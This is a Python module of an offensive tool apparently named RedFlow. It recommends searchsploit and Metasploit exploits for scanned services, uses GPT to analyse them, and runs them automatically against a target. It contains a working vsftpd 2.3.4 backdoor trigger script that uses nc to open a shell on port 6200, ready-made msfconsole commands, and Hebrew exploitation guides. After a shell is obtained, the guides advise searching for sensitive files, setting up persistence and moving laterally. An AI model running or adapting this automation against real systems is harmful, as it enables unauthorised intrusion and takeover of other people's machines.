#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit Suggester for RedFlow
Advanced exploit recommendation engine
"""

import os
import sys
import logging
from typing import Dict, List, Any, Optional, Tuple
import json

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from redflow.utils.config import Config
from redflow.modules.gpt.exploit_advisor import ExploitAdvisor, ExploitInfo
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.markdown import Markdown

class ExploitSuggester:
    """
    Main interface for suggesting exploits for vulnerabilities
    """
    
    def __init__(self, config: Config, logger: logging.Logger):
        """
        Initialize the exploit suggester
        
        Args:
            config: RedFlow configuration
            logger: Logger instance
        """
        self.config = config
        self.logger = logger
        self.console = Console()
        self.advisor = ExploitAdvisor(config, logger, self.console)
        
        # Check if we need to filter by a specific port
        self.specific_port = os.environ.get("REDFLOW_SPECIFIC_PORT", None)
        if self.specific_port:
            self.logger.info(f"Exploit suggester will filter by port {self.specific_port}")
            
    def suggest_exploits(self, target_info: Dict[str, Any]) -> Dict[str, List[Dict[str, Any]]]:
        """
        Suggest exploits for the target based on open ports and service information
        
        Args:
            target_info: Dictionary containing target information with open ports
            
        Returns:
            Dictionary of suggested exploits per service
        """
        self.logger.info("Starting exploit suggestion process")
        
        # Check if target_info is valid
        if not target_info or 'ports' not in target_info or not target_info['ports']:
            self.logger.warning("No ports found in target information")
            return {}
            
        # Extract target details
        target_ip = target_info.get('ip', 'Unknown')
        target_domain = target_info.get('domain', '')
        
        # If target_ip is still 'Unknown', check environment variable
        if target_ip == 'Unknown':
            target_ip = os.environ.get("REDFLOW_TARGET", "127.0.0.1")
            self.logger.info(f"Using target IP from environment: {target_ip}")
        
        self.console.print(f"\n[bold cyan]== RedFlow Exploit Advisor ==[/bold cyan]")
        self.console.print(f"Target: [bold]{target_ip}[/bold] {f'({target_domain})' if target_domain else ''}")
        
        # If specific port is set, filter to only show that port
        if self.specific_port and self.specific_port in target_info['ports']:
            self.console.print(f"[bold cyan]Focusing on port {self.specific_port} as requested[/bold cyan]")
            filtered_ports = {self.specific_port: target_info['ports'][self.specific_port]}
            target_info['ports'] = filtered_ports
        
        # Dictionary to store results
        suggested_exploits = {}
        
        # Track which exploits we've already displayed to avoid repetition
        already_shown_exploits = set()
        
        # Process each port
        for port_num, port_info in target_info['ports'].items():
            # Skip ports that are not open
            if port_info.get('state', '').lower() != 'open':
                continue
                
            service_name = port_info.get('service', '').lower()
            version = port_info.get('version', '')
            
            if not service_name:
                continue
            
            # Normalize service name and version for better matching
            # Special case for vsftpd which often appears as "ftp"
            normalized_service = service_name
            normalized_version = version
            
            # Check for common service naming patterns in version string
            if "vsftpd" in version.lower():
                normalized_service = "vsftpd"
                # Extract version number from string like "vsftpd 2.3.4"
                import re
                vsftpd_match = re.search(r'vsftpd\s+(\d+\.\d+\.\d+)', version.lower())
                if vsftpd_match:
                    normalized_version = vsftpd_match.group(1)
                self.logger.info(f"Detected vsftpd from version string: {normalized_service} {normalized_version}")
                
            self.logger.info(f"Looking for exploits for {service_name} {version} on port {port_num}")
            
            # Get exploits for service with exact version match first, using normalized values
            exploits = self.advisor.find_exploits_for_service(normalized_service, normalized_version)
            
            # If using original values got no results, try the original values
            if not exploits and (normalized_service != service_name or normalized_version != version):
                exploits = self.advisor.find_exploits_for_service(service_name, version)
            
            # Filter out exploits we've already shown
            unique_exploits = []
            for exploit in exploits:
                exploit_id = exploit.path
                if exploit_id not in already_shown_exploits:
                    unique_exploits.append(exploit)
                    already_shown_exploits.add(exploit_id)
            
            # If we have fewer than 3 unique exploits and version contains spaces or special chars,
            # try with just the first part of the version (more general)
            if len(unique_exploits) < 3 and version and self.config.exploitation.get("use_full_search", True):
                # Try with just the major version
                if ' ' in version or '-' in version or '/' in version:
                    # Extract just numbers at the beginning of the version string
                    import re
                    version_match = re.match(r'^(\d+(\.\d+)?)', version)
                    simplified_version = version_match.group(1) if version_match else ""
                    
                    if simplified_version:
                        self.logger.info(f"Searching for exploits with simplified version: {service_name} {simplified_version}")
                        broad_exploits = self.advisor.find_exploits_for_service(service_name, simplified_version)
                        
                        # Add more unique exploits
                        for exploit in broad_exploits:
                            exploit_id = exploit.path
                            if exploit_id not in already_shown_exploits:
                                unique_exploits.append(exploit)
                                already_shown_exploits.add(exploit_id)
                                if len(unique_exploits) >= 10:
                                    break
            
            if unique_exploits:
                self.logger.info(f"Found {len(unique_exploits)} potential exploits for {service_name}")
                
                # Set up a table to display exploits
                table = Table(title=f"Potential Exploits for {service_name} {version} on port {port_num}")
                table.add_column("#", style="white", justify="right")
                table.add_column("Exploit Name", style="cyan")
                table.add_column("Path", style="green")
                table.add_column("CVE", style="yellow")
                table.add_column("Analysis", style="magenta")
                
                # Store exploits for this service
                service_exploits = []
                
                # Maximum number of exploits to analyze with GPT
                max_gpt_analysis = 3 if self.config.use_gpt else 0
                analyzed_count = 0
                
                for i, exploit in enumerate(unique_exploits[:10], 1):  # Limit to top 10 exploits
                    # Convert exploit to dictionary for output
                    exploit_dict = exploit.to_dict()
                    
                    # Get GPT analysis for top exploits if use_gpt is enabled
                    gpt_analysis = None
                    if self.config.use_gpt and analyzed_count < max_gpt_analysis:
                        self.logger.info(f"Analyzing exploit {exploit.title} with GPT")
                        gpt_analysis = self.advisor.analyze_exploit_with_gpt(
                            exploit, service_name, version
                        )
                        analyzed_count += 1
                        
                    exploit_dict["gpt_analysis"] = gpt_analysis
                    service_exploits.append(exploit_dict)
                    
                    # Add to table
                    assessment = "GPT Analysis Available" if gpt_analysis else "Not Analyzed"
                    table.add_row(
                        str(i),
                        exploit.title,
                        os.path.basename(exploit.path),
                        exploit.cve or "Unknown",
                        assessment
                    )
                
                # Store results
                suggested_exploits[f"{service_name}:{port_num}"] = service_exploits
                
                # Display table
                self.console.print(table)
                
                # Offer to run or analyze an exploit immediately
                self.console.print("\n[bold cyan]Would you like to analyze or run one of these exploits? (y/n)[/bold cyan]")
                run_exploit = input("> ").strip().lower().startswith("y")
                
                if run_exploit:
                    # Ask which exploit to run
                    self.console.print("[bold cyan]Enter the number of the exploit you want to work with:[/bold cyan]")
                    exploit_num = input("> ").strip()
                    
                    try:
                        exploit_idx = int(exploit_num) - 1
                        if 0 <= exploit_idx < len(service_exploits):
                            selected_exploit = service_exploits[exploit_idx]
                            
                            # Show detailed GPT analysis if available
                            if selected_exploit.get("gpt_analysis"):
                                self.console.print(
                                    Panel(
                                        Markdown(selected_exploit["gpt_analysis"]),
                                        title=f"GPT Analysis: {selected_exploit['title']}",
                                        border_style="blue"
                                    )
                                )
                                
                            # Ask what to do with this exploit
                            self.console.print("\n[bold cyan]What would you like to do?[/bold cyan]")
                            self.console.print("[1] View exploit code")
                            self.console.print("[2] Run with Metasploit (if applicable)")
                            self.console.print("[3] Manual exploitation guidance")
                            self.console.print("[4] Return to main menu")
                            action = input("> ").strip()
                            
                            if action == "1":
                                # View exploit code
                                self._view_exploit_code(selected_exploit)
                            elif action == "2":
                                # Try to run with metasploit
                                self._run_exploit_with_metasploit(selected_exploit, target_ip, port_num)
                            elif action == "3":
                                # Provide manual guidance
                                self._provide_manual_guidance(selected_exploit, service_name, version, target_ip, port_num)
                        else:
                            self.console.print("[bold red]Invalid selection.[/bold red]")
                    except ValueError:
                        self.console.print("[bold red]Invalid selection.[/bold red]")
            else:
                self.console.print(f"No exploits found for {service_name} {version}")
                
        return suggested_exploits
    
    def _view_exploit_code(self, exploit: Dict[str, Any]) -> None:
        """
        Display the code of an exploit file
        
        Args:
            exploit: Exploit information dictionary
        """
        self.logger.info(f"Displaying exploit code for {exploit.get('path', 'Unknown')}")
        
        if not exploit.get('path'):
            self.console.print(f"[bold red]Exploit path not found[/bold red]")
            return
            
        try:
            with open(exploit.get('path'), 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
            self.console.print(Panel(content, title=f"Exploit Code: {os.path.basename(exploit.get('path', 'Unknown'))}", border_style="green"))
        except Exception as e:
            self.logger.error(f"Error reading exploit file: {e}")
            self.console.print(f"[bold red]Error reading exploit file: {e}[/bold red]")
    
    def _run_exploit_with_metasploit(self, exploit: Dict[str, Any], target_ip: str, port: str) -> None:
        """
        Run an exploit with Metasploit
        
        Args:
            exploit: Exploit information dictionary
            target_ip: Target IP address
            port: Target port
        """
        self.logger.info(f"Running exploit {exploit.get('title', 'Unknown exploit')} with Metasploit")
        
        # Check if this is a Python file from searchsploit
        exploit_path = exploit.get('path', '')
        if exploit_path.endswith('.py') and not exploit.get('metasploit_path'):
            self.logger.info(f"Detected Python exploit from searchsploit: {exploit_path}")
            self.console.print(f"[bold yellow]This appears to be a Python script from searchsploit, not a Metasploit module.[/bold yellow]")
            self.console.print(f"[bold cyan]Would you like to run it directly? (y/n)[/bold cyan]")
            run_directly = input("> ").strip().lower().startswith("y")
            
            if run_directly:
                self._run_searchsploit_python(exploit, target_ip, port)
            return
            
        # Regular Metasploit handling
        if not exploit.get('metasploit_path'):
            self.console.print(f"[bold red]Metasploit path not found for {exploit.get('title', 'Unknown exploit')}[/bold red]")
            return
            
        try:
            resource_file = self.advisor.generate_metasploit_resource(
                exploit.get('metasploit_path'),
                target_ip,
                int(port)
            )
            if resource_file:
                self.advisor.run_metasploit_resource(resource_file)
        except Exception as e:
            self.logger.error(f"Error running exploit with Metasploit: {e}")
            self.console.print(f"[bold red]Error running exploit with Metasploit: {e}[/bold red]")
    
    def _run_searchsploit_python(self, exploit: Dict[str, Any], target_ip: str, port: str) -> None:
        """
        Run a Python exploit from searchsploit directly
        
        Args:
            exploit: Exploit information dictionary
            target_ip: Target IP address
            port: Target port
        """
        exploit_path = exploit.get('path', '')
        
        if not os.path.exists(exploit_path):
            self.console.print(f"[bold red]Exploit file not found: {exploit_path}[/bold red]")
            
            # Check if the exploit exists in the local directory (user may have downloaded it)
            local_name = os.path.basename(exploit_path)
            if os.path.exists(local_name):
                exploit_path = local_name
                self.console.print(f"[bold green]Found exploit in current directory: {local_name}[/bold green]")
            else:
                # Suggest downloading the exploit
                self.console.print("[bold yellow]You need to download the exploit first.[/bold yellow]")
                self.console.print(f"[bold yellow]Run: searchsploit -m {os.path.basename(exploit_path)}[/bold yellow]")
                
                # Auto-download the exploit if it's vsftpd 2.3.4
                if "vsftpd" in exploit.get('title', '').lower() and "2.3.4" in exploit.get('title', '').lower():
                    self.console.print("[bold cyan]Attempting to download the vsftpd 2.3.4 exploit automatically...[/bold cyan]")
                    try:
                        import subprocess
                        result = subprocess.run(["searchsploit", "-m", os.path.basename(exploit_path)], 
                                              capture_output=True, text=True)
                        if result.returncode == 0:
                            self.console.print("[bold green]Successfully downloaded the exploit![/bold green]")
                            local_name = os.path.basename(exploit_path)
                            if os.path.exists(local_name):
                                exploit_path = local_name
                            else:
                                self.console.print("[bold yellow]Downloaded exploit not found in current directory.[/bold yellow]")
                                # Try alternative Python script for vsftpd 2.3.4
                                self._handle_vsftpd_fallback(target_ip, port)
                                return
                        else:
                            self.console.print(f"[bold yellow]Failed to download the exploit: {result.stderr}[/bold yellow]")
                            # Try alternative approach for vsftpd 2.3.4
                            self._handle_vsftpd_fallback(target_ip, port)
                            return
                    except Exception as e:
                        self.console.print(f"[bold yellow]Error downloading exploit: {e}[/bold yellow]")
                        # Try alternative approach for vsftpd 2.3.4
                        self._handle_vsftpd_fallback(target_ip, port)
                        return
                else:
                    return
        
        # Make sure the file is executable
        self.console.print(f"[bold cyan]Making the exploit executable...[/bold cyan]")
        import subprocess
        try:
            subprocess.run(["chmod", "+x", exploit_path], check=True)
            self.console.print("[bold green]Successfully made the exploit executable[/bold green]")
        except Exception as e:
            self.console.print(f"[bold yellow]Warning: Could not make the exploit executable: {e}[/bold yellow]")
        
        # Special case for vsftpd 2.3.4 exploit
        is_vsftpd = "vsftpd" in exploit.get('title', '').lower() and "2.3.4" in exploit.get('title', '').lower()
            
        # Run the exploit
        self.console.print(f"[bold cyan]Running the exploit against {target_ip}:{port}...[/bold cyan]")
        try:
            # Try using python3 directly with the file
            if is_vsftpd:
                cmd_options = [
                    # For vsftpd, try to run with python3 directly first
                    ["python3", exploit_path, target_ip],
                    ["python3", exploit_path, target_ip, port],
                    ["python3", exploit_path, "-t", target_ip, "-p", port],
                    # Then try the original options
                    [exploit_path, target_ip],
                    [exploit_path, target_ip, port],
                    [exploit_path, "-t", target_ip, "-p", port],
                    [exploit_path, "--target", target_ip, "--port", port],
                    [exploit_path, "RHOST=" + target_ip, "RPORT=" + port]
                ]
            else:
                # Regular command options
                cmd_options = [
                    # Simple target IP only
                    [exploit_path, target_ip],
                    # Target IP and port
                    [exploit_path, target_ip, port],
                    # With -t for target
                    [exploit_path, "-t", target_ip, "-p", port],
                    # With --target and --port
                    [exploit_path, "--target", target_ip, "--port", port],
                    # With RHOST and RPORT (Metasploit-style)
                    [exploit_path, "RHOST=" + target_ip, "RPORT=" + port]
                ]
            
            # Check if we need to view help first
            self.console.print("[bold cyan]Would you like to see the exploit's help first? (y/n)[/bold cyan]")
            show_help = input("> ").strip().lower().startswith("y")
            
            if show_help:
                # Try to get help
                help_options = ["-h", "--help", "help"]
                help_found = False
                for help_opt in help_options:
                    try:
                        self.console.print(f"[bold cyan]Trying {help_opt} option...[/bold cyan]")
                        result = subprocess.run(["python3", exploit_path, help_opt] if is_vsftpd else [exploit_path, help_opt], 
                                              capture_output=True, text=True)
                        if result.stdout:
                            self.console.print(f"[bold green]Help output:[/bold green]\n{result.stdout}")
                            help_found = True
                            break
                    except Exception:
                        continue
                
                if not help_found and is_vsftpd:
                    self.console.print("[bold yellow]Could not get help output. Continuing with default options for vsftpd 2.3.4...[/bold yellow]")
                
                # Ask for custom command
                self.console.print("[bold cyan]Enter custom command to run the exploit (or leave empty to try default options):[/bold cyan]")
                custom_cmd = input("> ").strip()
                
                if custom_cmd:
                    # Parse the custom command and run it
                    import shlex
                    cmd_args = shlex.split(custom_cmd)
                    subprocess.run(cmd_args)
                    return
            
            # Try each option until one works
            for cmd in cmd_options:
                try:
                    self.console.print(f"[bold cyan]Trying command: {' '.join(cmd)}[/bold cyan]")
                    subprocess.run(cmd)
                    self.console.print("[bold green]Exploit execution completed[/bold green]")
                    
                    # For vsftpd, offer to check if the backdoor was opened
                    if is_vsftpd:
                        self.console.print("[bold cyan]Would you like to check if the backdoor opened on port 6200? (y/n)[/bold cyan]")
                        check_backdoor = input("> ").strip().lower().startswith("y")
                        if check_backdoor:
                            self.console.print(f"[bold cyan]Attempting to connect to backdoor on {target_ip}:6200...[/bold cyan]")
                            subprocess.run(["nc", "-v", target_ip, "6200"])
                    
                    break
                except Exception as e:
                    self.console.print(f"[bold yellow]Command failed: {e}[/bold yellow]")
                    # Ask if we should continue with the next option
                    if cmd != cmd_options[-1]:  # Not the last option
                        self.console.print("[bold cyan]Try next option? (y/n)[/bold cyan]")
                        try_next = input("> ").strip().lower().startswith("y")
                        if not try_next:
                            break
            
            # If we get here and it's vsftpd, try the fallback method
            if is_vsftpd:
                self.console.print("[bold yellow]Would you like to try a manual vsftpd 2.3.4 exploit method? (y/n)[/bold yellow]")
                try_manual = input("> ").strip().lower().startswith("y")
                if try_manual:
                    self._handle_vsftpd_fallback(target_ip, port)
        
        except Exception as e:
            self.logger.error(f"Error running Python exploit: {e}")
            self.console.print(f"[bold red]Error running Python exploit: {e}[/bold red]")
            
            # If this is vsftpd, offer fallback method
            if is_vsftpd:
                self.console.print("[bold yellow]Would you like to try a manual vsftpd 2.3.4 exploit method? (y/n)[/bold yellow]")
                try_manual = input("> ").strip().lower().startswith("y")
                if try_manual:
                    self._handle_vsftpd_fallback(target_ip, port)
    
    def _handle_vsftpd_fallback(self, target_ip: str, port: str) -> None:
        """
        Handle vsftpd 2.3.4 exploitation with manual methods when Python script fails
        
        Args:
            target_ip: Target IP address
            port: Target port
        """
        self.console.print("[bold cyan]Trying manual vsftpd 2.3.4 backdoor exploit...[/bold cyan]")
        
        # Create a bash script to trigger the exploit
        import tempfile
        import os
        import subprocess
        
        script_fd, script_path = tempfile.mkstemp(suffix='.sh')
        os.close(script_fd)
        
        with open(script_path, 'w') as f:
            f.write(f"""#!/bin/bash
echo "Attempting to trigger vsftpd 2.3.4 backdoor on {target_ip}:{port}..."
echo "Step 1: Sending malicious username with :) to trigger backdoor"
(echo "USER backdoor:)"; sleep 1; echo "PASS x"; sleep 5) | nc {target_ip} {port}

echo "Step 2: Waiting for backdoor to open on port 6200..."
sleep 3
echo "Step 3: Attempting to connect to backdoor shell on port 6200"
nc -v {target_ip} 6200
""")
        
        # Make the script executable
        try:
            subprocess.run(["chmod", "+x", script_path], check=True)
            self.console.print(f"[bold green]Created manual exploitation script at {script_path}[/bold green]")
            
            # Run the script
            self.console.print("[bold cyan]Running manual exploitation script...[/bold cyan]")
            subprocess.run([script_path])
            
            # Ask if it worked
            self.console.print("[bold yellow]Did the exploit provide you with a shell? (y/n)[/bold yellow]")
            success = input("> ").strip().lower().startswith("y")
            
            if success:
                self.console.print("[bold green]Exploitation successful![/bold green]")
            else:
                self.console.print("[bold yellow]Exploitation may have failed.[/bold yellow]")
                self.console.print("[bold cyan]Here are some troubleshooting tips:[/bold cyan]")
                self.console.print("1. Verify that the target is actually running vsftpd 2.3.4")
                self.console.print("2. Try connecting manually with an FTP client and send the trigger")
                self.console.print("3. Try the Metasploit module: exploit/unix/ftp/vsftpd_234_backdoor")
        
        except Exception as e:
            self.logger.error(f"Error in manual vsftpd exploitation: {e}")
            self.console.print(f"[bold red]Error in manual vsftpd exploitation: {e}[/bold red]")
            self.console.print("[bold yellow]Try using Metasploit instead:[/bold yellow]")
            self.console.print(f"msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target_ip}; set RPORT {port}; exploit\"")
    
    def _provide_manual_guidance(self, exploit: Dict[str, Any], service_name: str, version: str, target_ip: str, port: str) -> None:
        """
        Provide manual exploitation guidance
        
        Args:
            exploit: Exploit information dictionary
            service_name: Service name
            version: Service version
            target_ip: Target IP address
            port: Target port
        """
        self.logger.info(f"Showing manual guidance for {exploit.get('title', 'Unknown exploit')}")
        
        # Special case for vsftpd 2.3.4 backdoor (CVE-2011-2523)
        if "vsftpd 2.3.4" in exploit.get('title', '').lower() and "backdoor" in exploit.get('title', '').lower():
            self.logger.info("Providing specific guidance for vsftpd 2.3.4 backdoor")
            
            # Check if this is a Python file from searchsploit
            is_searchsploit_py = exploit.get('path', '').endswith('.py') and not exploit.get('metasploit_path')
            exploit_filename = os.path.basename(exploit.get('path', ''))
            
            guidance = f"""
# vsftpd 2.3.4 Backdoor Exploitation Guide

## רקע
בגרסה vsftpd 2.3.4 קיים backdoor שהוכנס לקוד המקורי. כאשר נשלח שם משתמש המכיל את התווים `:)` (סמיילי), 
נפתח shell אחורי בפורט 6200 של השרת.

## מידע על המטרה
- כתובת IP: {target_ip}
- פורט FTP: {port}
- שירות: vsftpd 2.3.4
- Exploit שנמצא: {exploit.get('title', 'Unknown')}
- מקור ה-Exploit: {"SearchSploit (קובץ Python)" if is_searchsploit_py else "Metasploit Framework"}

## שיטות ניצול

### שיטה 1: ניצול ידני
```bash
# שלב 1: התחברות לשרת FTP והפעלת ה-backdoor
ftp {target_ip} {port}
# כשמבקשים שם משתמש, הזן: "backdoor:)"
# כשמבקשים סיסמה, הזן כל טקסט שהוא

# שלב 2: חיבור ה-FTP ייתקע, לחץ Ctrl+C לביטול

# שלב 3: התחברות ל-shell האחורי בפורט 6200
nc {target_ip} 6200
```

"""

            # If this is a searchsploit Python exploit, add specific instructions
            if is_searchsploit_py:
                guidance += f"""
### שיטה 2: שימוש בסקריפט Python מ-SearchSploit
```bash
# שלב 1: הורדת ה-exploit אם עדיין לא הורדת אותו
searchsploit -m {exploit_filename}

# שלב 2: הגדרת הרשאות הרצה לקובץ
chmod +x {exploit_filename}

# שלב 3: הרצת ה-exploit
python3 {exploit_filename} {target_ip}
```

**שים לב**: אם הסקריפט נכשל עם שגיאות פרמטרים, נסה את האלטרנטיבות הבאות:
```bash
# אלטרנטיבה עם דגל target
python3 {exploit_filename} -t {target_ip}

# אלטרנטיבה עם פורט מפורש
python3 {exploit_filename} {target_ip} {port}

# אלטרנטיבה עם דגלי target ו-port
python3 {exploit_filename} --target {target_ip} --port {port}
```

**פתרון בעיות**: אם מתקבלת שגיאת Python, יתכן שתצטרך להריץ את הסקריפט עם Python מפורש:
```bash
python3 {exploit_filename} {target_ip}
```
"""
            
            # Add metasploit instructions as the third method
            guidance += f"""
### שיטה 3: שימוש במסגרת Metasploit
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {target_ip}
set RPORT {port}
exploit
```

## לאחר ניצול מוצלח
לאחר קבלת גישת shell:
1. בדוק את ההרשאות שלך עם `id` או `whoami`
2. חקור את המערכת, חפש קבצים רגישים
3. שקול יצירת התבססות קבועה במערכת או מעבר למערכות אחרות ברשת

## הערות
- ה-backdoor מאזין בפורט 6200 לזמן קצר בלבד
- אם החיבור נכשל, נסה להפעיל את ה-backdoor שוב
- פגיעות זו משפיעה רק על גרסה vsftpd 2.3.4 באופן ספציפי
- ודא תמיד שיש לך הרשאה מתאימה לפני בדיקת exploits
"""
            
            self.console.print(Panel(Markdown(guidance), title="vsftpd 2.3.4 Backdoor Exploitation Guide", border_style="red", expand=False))
            return
        
        # Create guidance based on file extension for other exploits
        file_ext = exploit.get("file_ext", "").lower()
        file_name = os.path.basename(exploit.get("path", ""))
        
        # Default guidance
        guidance = f"""
# מדריך ניצול ידני עבור {exploit.get('title', 'Unknown exploit')}

## מידע על המטרה
- כתובת IP: {target_ip}
- פורט: {port}
- שירות: {service_name}

## שלבי ניצול

### 1. מעבר למיקום ה-exploit
```bash
cd {os.path.dirname(exploit.get('path', ''))}
```

"""
        
        # Add specific guidance based on file type
        if file_ext == ".py":
            guidance += f"""
### 2. הרצת ה-exploit ב-Python 
```bash
# הורדת הקובץ ממאגר SearchSploit
searchsploit -m {file_name}

# הגדרת הרשאות הרצה
chmod +x {file_name}

# הרצה עם Python מפורש
python3 {file_name} --target {target_ip} --port {port}
# או
python3 {file_name} -t {target_ip} -p {port}
```

### 3. בדיקת פרמטרים נוספים נדרשים
```bash
python3 {file_name} --help
```
"""
        elif file_ext == ".rb" and exploit.get("metasploit_path"):
            guidance += f"""
### 2. הרצה עם Metasploit
```bash
msfconsole -q
use {exploit.get('metasploit_path')}
set RHOSTS {target_ip}
set RPORT {port}
show options
# מילוי כל הפרמטרים הנדרשים
exploit
```
"""
        elif file_ext in [".c", ".cpp"]:
            guidance += f"""
### 2. קומפילציה והרצת ה-exploit
```bash
gcc -o exploit {file_name}
./exploit {target_ip} {port}
```
"""
        else:
            guidance += f"""
### 2. סקירת קובץ ה-exploit כדי לקבוע כיצד להריץ אותו
```bash
cat {file_name}
```

### 3. הרצת ה-exploit בהתאם לדרישותיו
הפקודה המדויקת תלויה בסוג ה-exploit. בדוק את הערות הכותרת להוראות שימוש.
"""
        
        self.console.print(Panel(Markdown(guidance), title="מדריך ניצול ידני", border_style="cyan", expand=False))

if __name__ == "__main__":
    # Simple test code
    from redflow.utils.logger import get_logger
    
    config = Config()
    logger = get_logger("exploit_suggester", log_level=logging.INFO)
    
    suggester = ExploitSuggester(config, logger)
    
    # Test target info
    test_target = {
        "ip": "192.168.1.100",
        "domain": "example.com",
        "ports": {
            "21": {
                "service": "ftp",
                "version": "vsftpd 2.3.4",
                "state": "open"
            },
            "80": {
                "service": "http",
                "version": "Apache httpd 2.4.49",
                "state": "open"
            }
        }
    }
    
    # Run test
    suggester.suggest_exploits(test_target) 